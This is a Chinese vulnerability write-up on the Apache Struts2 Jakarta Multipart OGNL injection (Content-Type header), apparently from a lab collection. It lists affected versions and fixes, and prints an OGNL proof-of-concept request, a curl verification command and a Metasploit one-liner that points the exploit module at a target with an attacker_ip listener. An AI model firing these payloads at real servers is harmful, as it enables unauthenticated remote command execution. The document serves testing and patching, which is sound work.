## 漏洞描述

Struts2 在使用 Jakarta Multipart 解析器上传文件时，会对 Content-Type 中的 OGNL 表达式进行解析。攻击者可以通过构造恶意的 Content-Type 头执行 OGNL 表达式，导致远程命令执行。

## 影响版本

- Apache Struts 2.3.5 - 2.3.31
- Apache Struts 2.5 - 2.5.10

## 前置条件

- 无需认证
- 目标应用使用 Jakarta Multipart 解析器

## 利用步骤

1. 在 Content-Type 中注入 OGNL 表达式
2. 发送请求触发表达式执行

## Payload

```http
POST / HTTP/1.1
Host: target:8080
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data

```



Metasploit 利用:
```bash
msfconsole -q -x "use exploit/multi/http/struts2_content_type_ognl; set RHOSTS target; set TARGETURI /; set RPORT 8080; set LHOST attacker_ip; run"
```

## 验证方法

```bash
# 检查响应头中是否执行了 233*233
curl -I -X POST -H "Content-Type: %25%7B233*233%7D.multipart/form-data" http://target:8080/
```

## 修复建议

1. 升级 Apache Struts 至 2.3.32 或 2.5.11+
2. 升级 Struts2 框架
3. 使用其他 multipart 解析器
